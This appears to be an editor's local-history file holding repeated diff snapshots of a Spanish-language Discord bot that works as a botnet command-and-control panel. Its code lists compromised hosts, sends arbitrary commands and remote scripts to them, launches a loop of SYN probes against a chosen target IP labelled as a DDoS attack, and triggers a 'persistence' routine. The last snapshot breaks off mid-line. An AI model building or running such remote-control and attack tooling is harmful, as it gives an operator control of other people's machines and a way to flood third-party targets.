{
    "sourceFile": "src/discord_bot.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 12,
            "patches": [
                {
                    "date": 1740253469721,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1740253906642,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,228 @@\n+import discord\r\n+from discord.ext import commands\r\n+import logging\r\n+import configparser\r\n+import os\r\n+\r\n+# Cargar configuración\r\n+config = configparser.ConfigParser()\r\n+config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n+\r\n+intents = discord.Intents.default()\r\n+intents.message_content = True\r\n+bot = commands.Bot(command_prefix='!', intents=intents)\r\n+\r\n+@bot.event\r\n+async def on_ready():\r\n+    logging.info(f'Bot conectado como {bot.user}')\r\n+    print(f'Bot conectado como {bot.user}')\r\n+\r\n+@bot.command(name='listar_bots')\r\n+async def listar_bots_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para listar los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        if bots:\r\n+            response = \"\\nBots conectados:\\n\"\r\n+            for bot_conn in bots:\r\n+                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n+                response += f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\\n\"\r\n+        else:\r\n+            response = \"No hay bots conectados.\"\r\n+        await ctx.send(response)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al listar bots: {e}\")\r\n+        await ctx.send(\"Error al listar bots.\")\r\n+\r\n+@bot.command(name='enviar_comando')\r\n+async def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n+    \"\"\"\r\n+    Comando de Discord para enviar un comando a los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        enviar_comando(comando_windows, comando_linux)\r\n+        await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+        await ctx.send(\"Error al enviar comando.\")\r\n+\r\n+@bot.command(name='cerrar_conexion')\r\n+async def cerrar_conexion_command(ctx, bot_id: int):\r\n+    \"\"\"\r\n+    Comando de Discord para cerrar la conexión con un bot específico.\r\n+    \"\"\"\r\n+    try:\r\n+        cerrar_conexion_bots(bot_id)\r\n+        await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n+        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n+\r\n+@bot.command(name='menu_comandos')\r\n+async def menu_comandos_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar el menú de comandos.\r\n+    \"\"\"\r\n+    try:\r\n+        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n+        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+        tipo_comando = tipo_comando.content.strip()\r\n+\r\n+        if tipo_comando == \"1\":\r\n+            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n+            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+            orden = orden.content.strip()\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                comando_windows = \"systeminfo\"\r\n+                comando_linux = \"uname -a && lsb_release -a\"\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"netstat -ano\"\r\n+                comando_linux = \"netstat -tunapl\"\r\n+            elif orden == \"3\":\r\n+                comando_windows = \"tasklist\"\r\n+                comando_linux = \"ps aux\"\r\n+            elif orden == \"4\":\r\n+                comando_windows = \"dir\"\r\n+                comando_linux = \"ls -lah\"\r\n+            elif orden == \"5\":\r\n+                comando_windows = \"curl ifconfig.me\"\r\n+                comando_linux = \"curl ifconfig.me\"\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+\r\n+            enviar_comando(comando_windows, comando_linux)\r\n+\r\n+        elif tipo_comando == \"2\":\r\n+            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n+            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+            orden = orden.content.strip()\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n+                objetivo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                objetivo = objetivo.content.strip()\r\n+                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n+                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                puerto = puerto.content.strip()\r\n+                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n+                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                protocolo = protocolo.content.strip().upper()\r\n+                if protocolo not in [\"TCP\", \"UDP\"]:\r\n+                    await ctx.send(\"Protocolo no válido.\")\r\n+                    return\r\n+                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n+                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"stop_ddos\"\r\n+                comando_linux = \"stop_ddos\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n+            elif orden == \"3\":\r\n+                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n+                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                comando_windows = comando_windows.content.strip()\r\n+                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n+                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                comando_linux = comando_linux.content.strip()\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"4\":\r\n+                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n+                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                tipo = tipo.content.strip()\r\n+\r\n+                if tipo == \"1\":\r\n+                    extension = \"py\"\r\n+                    interprete_linux = \"python3 -c\"\r\n+                    interprete_windows = \"python -c\"\r\n+                elif tipo == \"2\":\r\n+                    extension = \"sh\"\r\n+                    interprete_linux = \"bash -c\"\r\n+                    interprete_windows = \"powershell -Command\"\r\n+                elif tipo == \"3\":\r\n+                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n+                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    extension = extension.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n+                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_linux = interprete_linux.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n+                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_windows = interprete_windows.content.strip()\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n+                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                metodo = metodo.content.strip()\r\n+\r\n+                if metodo == \"1\":\r\n+                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n+                    lineas = []\r\n+                    while True:\r\n+                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                        linea = linea.content.strip()\r\n+                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n+                            break\r\n+                        lineas.append(linea)\r\n+                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n+                elif metodo == \"2\":\r\n+                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n+                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    ruta = ruta.content.strip()\r\n+                    try:\r\n+                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n+                            script = archivo.read()\r\n+                    except Exception as e:\r\n+                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n+                        return\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n+                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n+\r\n+                comando_windows = f'{interprete_windows} \"{script}\"'\r\n+                comando_linux = f\"{interprete_linux} '{script}'\"\r\n+\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"5\":\r\n+                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n+                comando_windows = \"persistencia\"\r\n+                comando_linux = \"persistencia\"\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+        else:\r\n+            await ctx.send(\"Opción no válida.\")\r\n+            return\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el menú de comandos: {e}\")\r\n+        await ctx.send(\"Error en el menú de comandos.\")\r\n+\r\n+@bot.command(name='ayuda')\r\n+async def ayuda_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar la ayuda del bot.\r\n+    \"\"\"\r\n+    help_text = \"\"\"\r\n+    **Comandos disponibles:**\r\n+\r\n+    **!listar_bots**\r\n+    - Lista los bots conectados al servidor.\r\n+\r\n+    **!enviar_comando <comando_windows> <comando_linux>**\r\n+    - Envía un comando a los bots conectados.\r\n+    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n+\r\n+    **!cerrar_conexion <bot_id>**\r\n+    - Cierra la conexión con un bot específico\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740253951304,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -224,233 +224,5 @@\n     - Envía un comando a los bots conectados.\r\n     - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n \r\n     **!cerrar_conexion <bot_id>**\r\n-    - Cierra la conexión con un bot específico\n-import discord\r\n-from discord.ext import commands\r\n-import logging\r\n-import configparser\r\n-import os\r\n-\r\n-# Cargar configuración\r\n-config = configparser.ConfigParser()\r\n-config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n-\r\n-intents = discord.Intents.default()\r\n-intents.message_content = True\r\n-bot = commands.Bot(command_prefix='!', intents=intents)\r\n-\r\n-@bot.event\r\n-async def on_ready():\r\n-    logging.info(f'Bot conectado como {bot.user}')\r\n-    print(f'Bot conectado como {bot.user}')\r\n-\r\n-@bot.command(name='listar_bots')\r\n-async def listar_bots_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para listar los bots conectados.\r\n-    \"\"\"\r\n-    try:\r\n-        if bots:\r\n-            response = \"\\nBots conectados:\\n\"\r\n-            for bot_conn in bots:\r\n-                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n-                response += f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\\n\"\r\n-        else:\r\n-            response = \"No hay bots conectados.\"\r\n-        await ctx.send(response)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al listar bots: {e}\")\r\n-        await ctx.send(\"Error al listar bots.\")\r\n-\r\n-@bot.command(name='enviar_comando')\r\n-async def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n-    \"\"\"\r\n-    Comando de Discord para enviar un comando a los bots conectados.\r\n-    \"\"\"\r\n-    try:\r\n-        enviar_comando(comando_windows, comando_linux)\r\n-        await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-        await ctx.send(\"Error al enviar comando.\")\r\n-\r\n-@bot.command(name='cerrar_conexion')\r\n-async def cerrar_conexion_command(ctx, bot_id: int):\r\n-    \"\"\"\r\n-    Comando de Discord para cerrar la conexión con un bot específico.\r\n-    \"\"\"\r\n-    try:\r\n-        cerrar_conexion_bots(bot_id)\r\n-        await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n-        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n-\r\n-@bot.command(name='menu_comandos')\r\n-async def menu_comandos_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para mostrar el menú de comandos.\r\n-    \"\"\"\r\n-    try:\r\n-        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n-        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-        tipo_comando = tipo_comando.content.strip()\r\n-\r\n-        if tipo_comando == \"1\":\r\n-            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n-            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-            orden = orden.content.strip()\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                comando_windows = \"systeminfo\"\r\n-                comando_linux = \"uname -a && lsb_release -a\"\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"netstat -ano\"\r\n-                comando_linux = \"netstat -tunapl\"\r\n-            elif orden == \"3\":\r\n-                comando_windows = \"tasklist\"\r\n-                comando_linux = \"ps aux\"\r\n-            elif orden == \"4\":\r\n-                comando_windows = \"dir\"\r\n-                comando_linux = \"ls -lah\"\r\n-            elif orden == \"5\":\r\n-                comando_windows = \"curl ifconfig.me\"\r\n-                comando_linux = \"curl ifconfig.me\"\r\n-            else:\r\n-                await ctx.send(\"Opción no válida.\")\r\n-                return\r\n-\r\n-            enviar_comando(comando_windows, comando_linux)\r\n-\r\n-        elif tipo_comando == \"2\":\r\n-            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n-            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-            orden = orden.content.strip()\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n-                objetivo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                objetivo = objetivo.content.strip()\r\n-                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n-                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                puerto = puerto.content.strip()\r\n-                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n-                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                protocolo = protocolo.content.strip().upper()\r\n-                if protocolo not in [\"TCP\", \"UDP\"]:\r\n-                    await ctx.send(\"Protocolo no válido.\")\r\n-                    return\r\n-                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n-                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"stop_ddos\"\r\n-                comando_linux = \"stop_ddos\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n-            elif orden == \"3\":\r\n-                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n-                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                comando_windows = comando_windows.content.strip()\r\n-                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n-                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                comando_linux = comando_linux.content.strip()\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"4\":\r\n-                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n-                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                tipo = tipo.content.strip()\r\n-\r\n-                if tipo == \"1\":\r\n-                    extension = \"py\"\r\n-                    interprete_linux = \"python3 -c\"\r\n-                    interprete_windows = \"python -c\"\r\n-                elif tipo == \"2\":\r\n-                    extension = \"sh\"\r\n-                    interprete_linux = \"bash -c\"\r\n-                    interprete_windows = \"powershell -Command\"\r\n-                elif tipo == \"3\":\r\n-                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n-                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    extension = extension.content.strip()\r\n-                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n-                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    interprete_linux = interprete_linux.content.strip()\r\n-                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n-                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    interprete_windows = interprete_windows.content.strip()\r\n-                else:\r\n-                    await ctx.send(\"Opción inválida.\")\r\n-                    return\r\n-\r\n-                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n-                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                metodo = metodo.content.strip()\r\n-\r\n-                if metodo == \"1\":\r\n-                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n-                    lineas = []\r\n-                    while True:\r\n-                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                        linea = linea.content.strip()\r\n-                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n-                            break\r\n-                        lineas.append(linea)\r\n-                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n-                elif metodo == \"2\":\r\n-                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n-                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    ruta = ruta.content.strip()\r\n-                    try:\r\n-                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n-                            script = archivo.read()\r\n-                    except Exception as e:\r\n-                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n-                        return\r\n-                else:\r\n-                    await ctx.send(\"Opción inválida.\")\r\n-                    return\r\n-\r\n-                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n-                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n-\r\n-                comando_windows = f'{interprete_windows} \"{script}\"'\r\n-                comando_linux = f\"{interprete_linux} '{script}'\"\r\n-\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"5\":\r\n-                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n-                comando_windows = \"persistencia\"\r\n-                comando_linux = \"persistencia\"\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            else:\r\n-                await ctx.send(\"Opción no válida.\")\r\n-                return\r\n-        else:\r\n-            await ctx.send(\"Opción no válida.\")\r\n-            return\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en el menú de comandos: {e}\")\r\n-        await ctx.send(\"Error en el menú de comandos.\")\r\n-\r\n-@bot.command(name='ayuda')\r\n-async def ayuda_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para mostrar la ayuda del bot.\r\n-    \"\"\"\r\n-    help_text = \"\"\"\r\n-    **Comandos disponibles:**\r\n-\r\n-    **!listar_bots**\r\n-    - Lista los bots conectados al servidor.\r\n-\r\n-    **!enviar_comando <comando_windows> <comando_linux>**\r\n-    - Envía un comando a los bots conectados.\r\n-    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n-\r\n-    **!cerrar_conexion <bot_id>**\r\n     - Cierra la conexión con un bot específico\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740253969340,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,237 @@\n+import discord\r\n+from discord.ext import commands\r\n+import logging\r\n+import configparser\r\n+import os\r\n+\r\n+# Cargar configuración\r\n+config = configparser.ConfigParser()\r\n+config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n+\r\n+intents = discord.Intents.default()\r\n+intents.message_content = True\r\n+bot = commands.Bot(command_prefix='!', intents=intents)\r\n+\r\n+@bot.event\r\n+async def on_ready():\r\n+    logging.info(f'Bot conectado como {bot.user}')\r\n+    print(f'Bot conectado como {bot.user}')\r\n+\r\n+@bot.command(name='listar_bots')\r\n+async def listar_bots_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para listar los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        if bots:\r\n+            response = \"\\nBots conectados:\\n\"\r\n+            for bot_conn in bots:\r\n+                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n+                response += f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\\n\"\r\n+        else:\r\n+            response = \"No hay bots conectados.\"\r\n+        await ctx.send(response)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al listar bots: {e}\")\r\n+        await ctx.send(\"Error al listar bots.\")\r\n+\r\n+@bot.command(name='enviar_comando')\r\n+async def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n+    \"\"\"\r\n+    Comando de Discord para enviar un comando a los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        enviar_comando(comando_windows, comando_linux)\r\n+        await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+        await ctx.send(\"Error al enviar comando.\")\r\n+\r\n+@bot.command(name='cerrar_conexion')\r\n+async def cerrar_conexion_command(ctx, bot_id: int):\r\n+    \"\"\"\r\n+    Comando de Discord para cerrar la conexión con un bot específico.\r\n+    \"\"\"\r\n+    try:\r\n+        cerrar_conexion_bots(bot_id)\r\n+        await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n+        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n+\r\n+@bot.command(name='menu_comandos')\r\n+async def menu_comandos_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar el menú de comandos.\r\n+    \"\"\"\r\n+    try:\r\n+        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n+        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+        tipo_comando = tipo_comando.content.strip()\r\n+\r\n+        if tipo_comando == \"1\":\r\n+            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n+            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+            orden = orden.content.strip()\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                comando_windows = \"systeminfo\"\r\n+                comando_linux = \"uname -a && lsb_release -a\"\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"netstat -ano\"\r\n+                comando_linux = \"netstat -tunapl\"\r\n+            elif orden == \"3\":\r\n+                comando_windows = \"tasklist\"\r\n+                comando_linux = \"ps aux\"\r\n+            elif orden == \"4\":\r\n+                comando_windows = \"dir\"\r\n+                comando_linux = \"ls -lah\"\r\n+            elif orden == \"5\":\r\n+                comando_windows = \"curl ifconfig.me\"\r\n+                comando_linux = \"curl ifconfig.me\"\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+\r\n+            enviar_comando(comando_windows, comando_linux)\r\n+\r\n+        elif tipo_comando == \"2\":\r\n+            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n+            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+            orden = orden.content.strip()\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n+                objetivo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                objetivo = objetivo.content.strip()\r\n+                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n+                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                puerto = puerto.content.strip()\r\n+                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n+                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                protocolo = protocolo.content.strip().upper()\r\n+                if protocolo not in [\"TCP\", \"UDP\"]:\r\n+                    await ctx.send(\"Protocolo no válido.\")\r\n+                    return\r\n+                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n+                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"stop_ddos\"\r\n+                comando_linux = \"stop_ddos\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n+            elif orden == \"3\":\r\n+                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n+                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                comando_windows = comando_windows.content.strip()\r\n+                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n+                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                comando_linux = comando_linux.content.strip()\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"4\":\r\n+                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n+                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                tipo = tipo.content.strip()\r\n+\r\n+                if tipo == \"1\":\r\n+                    extension = \"py\"\r\n+                    interprete_linux = \"python3 -c\"\r\n+                    interprete_windows = \"python -c\"\r\n+                elif tipo == \"2\":\r\n+                    extension = \"sh\"\r\n+                    interprete_linux = \"bash -c\"\r\n+                    interprete_windows = \"powershell -Command\"\r\n+                elif tipo == \"3\":\r\n+                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n+                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    extension = extension.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n+                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_linux = interprete_linux.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n+                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_windows = interprete_windows.content.strip()\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n+                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                metodo = metodo.content.strip()\r\n+\r\n+                if metodo == \"1\":\r\n+                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n+                    lineas = []\r\n+                    while True:\r\n+                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                        linea = linea.content.strip()\r\n+                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n+                            break\r\n+                        lineas.append(linea)\r\n+                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n+                elif metodo == \"2\":\r\n+                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n+                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    ruta = ruta.content.strip()\r\n+                    try:\r\n+                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n+                            script = archivo.read()\r\n+                    except Exception as e:\r\n+                        await ctx.send(f\"Error al leer el archivo: 